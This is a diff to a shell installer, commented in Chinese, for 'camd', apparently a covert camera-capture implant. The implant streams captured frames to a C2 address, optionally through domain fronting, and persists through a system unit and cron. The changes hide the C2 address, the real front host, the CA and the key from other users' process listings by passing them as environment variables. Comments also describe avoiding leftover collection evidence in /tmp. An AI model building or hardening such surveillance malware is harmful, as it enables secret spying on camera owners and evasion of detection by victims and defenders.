@@ -290,17 +290,25 @@ extract_bin() {
 # "单元 / cron / 试运行"三处独立书写必然发散：一处带前缀、两处漏。
 # 现在三者统一从 conf 的 CAMD_SINK / CAMD_EXTRA 读取，本函数是唯一产地。
 sink_lines() {
+    # 【纪律：落点参数一律走环境变量，不拼命令行】
+    #
+    # 此前 run.sh 是 exec camd --sink "$CAMD_SINK" $CAMD_EXTRA --backend ...，
+    # 而 /proc/<pid>/cmdline 是 0444 世界可读——任何本地用户 ps 一下就得到
+    # C2 地址；front:// 形态下连真实目标（--front-host）也在同一行里。
+    # 环境变量在 /proc/<pid>/environ，权限 0400 且仅同用户 / root 可读。
+    #
+    # 副作用是彻底消灭了一类缺陷：CAMD_EXTRA 曾在 conf 里写成
+    # `--front-host x --ca y`（无引号），被 `. ` source 时解析成"临时环境
+    # 变量 + 执行命令"，CAMD_EXTRA 反而为空。改成分立的标量环境变量后，
+    # 多词拼接这一形态不再存在。
     if [ -n "$FRONT_HOST" ]; then
-        printf 'CAMD_SINK=front://%s\n' "$C2"
-        # 【必须加引号：实测踩出来的缺陷】
-        # 写成 CAMD_EXTRA=--front-host x --ca y（无引号）时，conf 被
-        # `. ` source 会被解析成"临时环境变量 + 执行命令"：
-        # CAMD_EXTRA 根本没被赋值（保持空），shell 还试图运行 "x" 这个命令。
-        # 现象是 camd 报 --front-host 未指定，而 conf 里明明写着——极难定位。
-        printf 'CAMD_EXTRA="--front-host %s --ca %s"\n' "$FRONT_HOST" "$CA_DEST"
+        printf 'CAMD_SINK="front://%s"\n' "$C2"
+        printf 'CAMD_FRONT_HOST="%s"\n' "$FRONT_HOST"
+        printf 'CAMD_CA="%s"\n' "$CA_DEST"
     else
-        printf 'CAMD_SINK=tcp://%s\n' "$C2"
-        printf 'CAMD_EXTRA=\n'
+        printf 'CAMD_SINK="tcp://%s"\n' "$C2"
+        printf 'CAMD_FRONT_HOST=\n'
+        printf 'CAMD_CA=\n'
     fi
 }
 
@@ -394,7 +402,13 @@ set +a
 # （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
 # 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
 # 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
-exec "\$BIN_ABS" --sink "\$CAMD_SINK" \$CAMD_EXTRA --backend "\$CAMD_BACKEND" "\$@"
+# 【命令行不得含落点/密钥】/proc/<pid>/cmdline 是 0444 世界可读，任何本地
+# 用户 ps 一下就得到 C2 地址；front:// 形态下 --front-host 是真实目标，
+# 比前置域更敏感。sink / front-host / ca / key / backend 一律由上面的
+# `set -a` 导出，camd 从 /proc/<pid>/environ（0400，仅同用户/root）读取。
+# \$CAMD_EXTRA 已废弃：多词拼接会被 conf 解析成"临时环境变量+命令"，改成分
+# 立标量 CAMD_FRONT_HOST / CAMD_CA 后此形态不复存在。
+exec "\$BIN_ABS" "\$@"
 RUNEOF
     chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
     OK "启动器已写入 $LIB_DIR/run.sh（0700）"
@@ -564,10 +578,14 @@ verify_run() {
     # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
     # 与驻留路径同源：直接读 conf 的 CAMD_SINK / CAMD_EXTRA / CAMD_KEY，
     # 不在此处另拼一份 sink。否则衡量的就不是驻留进程真正会用的出口。
+    # 试运行同样不得把落点/密钥拼进命令行（ps 世界可读）。用 set -a 导出
+    # conf 后由 camd 从环境读取，与驻留路径（run.sh）完全一致——否则试运行
+    # 衡量的就不是驻留进程真正会用的出口。
     CAMD_SINK=""; CAMD_EXTRA=""; CAMD_BACKEND="$BACKEND"; CAMD_KEY="$KEY"
+    set -a
     . "$CONF_FILE"
-    RUN_OUT=$("$BIN_DST" --sink "$CAMD_SINK" $CAMD_EXTRA --backend "$CAMD_BACKEND" \
-               --key "$KEY" --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
+    set +a
+    RUN_OUT=$("$BIN_DST" --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
     RC=$?
     N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
     [ -n "$N" ] || N=0
